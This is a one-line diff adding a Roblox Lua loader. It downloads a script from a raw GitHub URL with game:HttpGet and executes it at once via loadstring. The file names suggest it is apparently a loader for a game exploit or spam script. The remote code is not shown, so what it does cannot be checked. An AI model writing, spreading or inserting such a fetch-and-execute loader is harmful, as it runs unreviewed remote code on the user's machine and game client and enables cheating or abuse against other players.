@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/huss-valley-spam7-g5gobfb7eg8et7.lua"))()
